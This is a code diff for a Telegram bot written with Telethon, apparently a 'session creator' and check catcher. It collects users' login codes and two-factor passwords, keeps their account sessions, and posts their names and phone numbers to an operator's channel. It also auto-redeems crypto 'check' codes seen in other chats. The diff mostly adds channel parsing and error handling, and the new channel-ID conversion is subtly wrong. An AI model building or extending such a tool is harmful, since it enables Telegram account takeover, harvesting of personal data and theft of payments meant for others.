@@ -1,21 +1,20 @@
 import os
 import asyncio
 import time
-import pickle
+import re
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from telethon.tl.types import InputMessagesFilterEmpty
 import logging
 
 # Настройка логирования
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 # ========== НАСТРОЙКИ ==========
 api_id = int(os.getenv('API_ID', '27258770'))
 api_hash = os.getenv('API_HASH', '')
 bot_token = os.getenv('LOVEC', '')
-channel = os.getenv('CHANNEL', '@lovec_chekovv')
+channel_input = os.getenv('CHANNEL', '-4902536707')  # Ваша переменная
 
 print("=" * 50)
 print("🚀 LOVEС CHECK BOT - Session Creator Version")
@@ -28,7 +27,53 @@ if not api_id or not api_hash or not bot_token:
 
 print(f"✅ API_ID: {api_id}")
 print(f"✅ BOT_TOKEN: {'установлен' if bot_token else 'НЕТ!'}")
-print(f"✅ CHANNEL: {channel}")
+print(f"✅ CHANNEL input: {channel_input}")
+
+# ========== ПРЕОБРАЗОВАНИЕ CHANNEL ==========
+# Обрабатываем разные форматы канала
+def parse_channel(channel_str):
+    """Преобразует строку канала в правильный формат"""
+    if not channel_str:
+        return None
+    
+    # Если это число (ID канала)
+    try:
+        if channel_str.startswith('-100'):
+            return int(channel_str)
+        elif channel_str.startswith('-'):
+            # Добавляем -100 для ID каналов
+            channel_id = int(channel_str)
+            if channel_id < 0:
+                # Приватные каналы имеют отрицательные ID с префиксом -100
+                return -100 * abs(channel_id)
+            return channel_id
+        elif channel_str.lstrip('-').isdigit():
+            # Просто число
+            return int(channel_str)
+    except:
+        pass
+    
+    # Если это username (начинается с @)
+    if channel_str.startswith('@'):
+        return channel_str
+    
+    # Если это ссылка
+    if 't.me/' in channel_str:
+        # Извлекаем username из ссылки
+        match = re.search(r't\.me/([a-zA-Z0-9_]+)', channel_str)
+        if match:
+            return '@' + match.group(1)
+        return channel_str
+    
+    # По умолчанию пробуем как username
+    if not channel_str.startswith('@'):
+        return '@' + channel_str
+    
+    return channel_str
+
+# Преобразуем канал
+channel = parse_channel(channel_input)
+print(f"✅ Parsed CHANNEL: {channel}")
 
 # ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
 user_sessions = {}
@@ -183,8 +228,8 @@ async def message_handler(event):
                         f"📱 Телефон: {me.phone}\n"
                         f"🕐 Время: {time.strftime('%H:%M:%S')}"
                     )
-                except:
-                    pass
+                except Exception as e:
+                    print(f"⚠️ Не удалось отправить в канал: {e}")
                 
             except Exception as e:
                 await event.reply(f"❌ Ошибка входа: {e}")
@@ -192,9 +237,12 @@ async def message_handler(event):
                     await event.reply("🔐 Введите пароль двухфакторной аутентификации:")
                     user_states[user_id] = 'waiting_password'
                 else:
-                    del user_clients[user_id]
-                    del user_states[user_id]
-                    del user_sessions[user_id]
+                    if user_id in user_clients:
+                        del user_clients[user_id]
+                    if user_id in user_states:
+                        del user_states[user_id]
+                    if user_id in user_sessions:
+                        del user_sessions[user_id]
         
         elif state == 'waiting_password':
             password = text
@@ -218,9 +266,12 @@ async def message_handler(event):
                 
             except Exception as e:
                 await event.reply(f"❌ Ошибка пароля: {e}")
-                del user_clients[user_id]
-                del user_states[user_id]
-                del user_sessions[user_id]
+                if user_id in user_clients:
+                    del user_clients[user_id]
+                if user_id in user_states:
+                    del user_states[user_id]
+                if user_id in user_sessions:
+                    del user_sessions[user_id]
 
 # ========== ФУНКЦИЯ ЛОВЛИ ЧЕКОВ ==========
 async def catch_checks(user_id):
@@ -233,13 +284,16 @@ async def catch_checks(user_id):
     try:
         # Получаем информацию о пользователе
         me = await client.get_me()
-        await bot.send_message(
-            channel,
-            f"🎯 **Начата ловля чеков!**\n\n"
-            f"👤 Пользователь: {me.first_name}\n"
-            f"📱 Телефон: {me.phone}\n"
-            f"⏰ Время: {time.strftime('%H:%M:%S')}"
-        )
+        try:
+            await bot.send_message(
+                channel,
+                f"🎯 **Начата ловля чеков!**\n\n"
+                f"👤 Пользователь: {me.first_name}\n"
+                f"📱 Телефон: {me.phone}\n"
+                f"⏰ Время: {time.strftime('%H:%M:%S')}"
+            )
+        except Exception as e:
+            print(f"⚠️ Не удалось отправить в канал: {e}")
         
         # Список чатов для мониторинга (ID ботов с чеками)
         monitor_chats = [
@@ -279,7 +333,6 @@ async def catch_checks(user_id):
                 for pattern in check_patterns:
                     if pattern in text:
                         # Извлекаем код
-                        import re
                         match = re.search(r'start=([A-Za-z0-9_-]+)', text)
                         if match:
                             code = match.group(1)
@@ -289,14 +342,17 @@ async def catch_checks(user_id):
                             await client.send_message(bot_name, f'/start {code}')
                             
                             # Отправляем уведомление
-                            await bot.send_message(
-                                channel,
-                                f"💰 **Чек активирован!**\n\n"
-                                f"🎯 Код: `{code[:10]}...`\n"
-                                f"🤖 Бот: @{bot_name}\n"
-                                f"👤 От: {me.first_name}\n"
-                                f"⏰ Время: {time.strftime('%H:%M:%S')}"
-                            )
+                            try:
+                                await bot.send_message(
+                                    channel,
+                                    f"💰 **Чек активирован!**\n\n"
+                                    f"🎯 Код: `{code[:10]}...`\n"
+                                    f"🤖 Бот: @{bot_name}\n"
+                                    f"👤 От: {me.first_name}\n"
+                                    f"⏰ Время: {time.strftime('%H:%M:%S')}"
+                                )
+                            except:
+                                pass
                             
                             print(f"✅ Активирован чек: {code}")
                             await asyncio.sleep(2)  # Задержка между чеками
@@ -311,12 +367,15 @@ async def catch_checks(user_id):
         await client.run_until_disconnected()
         
     except Exception as e:
-        await bot.send_message(
-            channel,
-            f"❌ **Ошибка ловли чеков!**\n\n"
-            f"👤 Пользователь: ID{user_id}\n"
-            f"⚠️ Ошибка: {str(e)[:100]}"
-        )
+        try:
+            await bot.send_message(
+                channel,
+                f"❌ **Ошибка ловли чеков!**\n\n"
+                f"👤 Пользователь: ID{user_id}\n"
+                f"⚠️ Ошибка: {str(e)[:100]}"
+            )
+        except:
+            pass
         print(f"❌ Ошибка catch_checks: {e}")
 
 # ========== ЗАПУСК ==========
@@ -331,14 +390,20 @@ async def main():
         print(f"✅ Бот запущен: @{me.username}")
         
         # Отправляем сообщение в канал
-        await bot.send_message(
-            channel,
-            f"🤖 **Session Creator Bot запущен!**\n\n"
-            f"⏰ Время: {time.strftime('%H:%M:%S')}\n"
-            f"🔗 Бот: @{me.username}\n"
-            f"🆔 ID: {me.id}\n\n"
-            f"📱 Напишите боту в ЛС для создания сессии"
-        )
+        try:
+            await bot.send_message(
+                channel,
+                f"🤖 **Session Creator Bot запущен!**\n\n"
+                f"⏰ Время: {time.strftime('%H:%M:%S')}\n"
+                f"🔗 Бот: @{me.username}\n"
+                f"🆔 ID: {me.id}\n\n"
+                f"📱 Напишите боту в ЛС для создания сессии"
+            )
+            print(f"📢 Сообщение отправлено в канал: {channel}")
+        except Exception as e:
+            print(f"⚠️ Не удалось отправить в канал: {e}")
+            print(f"💡 Проверьте формат канала. Текущий: {channel}")
+            print("💡 Попробуйте использовать ID канала с префиксом -100")
         
         print("=" * 50)
         print("✅ ВСЁ ЗАПУЩЕНО!")
